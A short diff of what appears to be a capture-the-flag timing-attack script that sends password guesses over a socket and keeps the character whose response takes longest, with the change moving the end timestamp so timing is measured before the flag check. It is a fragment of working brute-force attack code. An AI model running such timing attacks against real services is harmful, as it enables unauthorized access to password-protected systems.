@@ -103,11 +103,12 @@ for i in range(PASS_LEN):
         s.recv(4096)  # read but ignore the prompt
         s.send(guess + b"\n")
         flag = s.recv(4096)
+        end = time.time_ns()
+
         if flag:
             print("Profit from the flag: '{}'".format(flag))
             exit(0)
 
-        end = time.time_ns()
         duration = end - start
         if duration > best_char[1]:
             best_char = (c, duration)
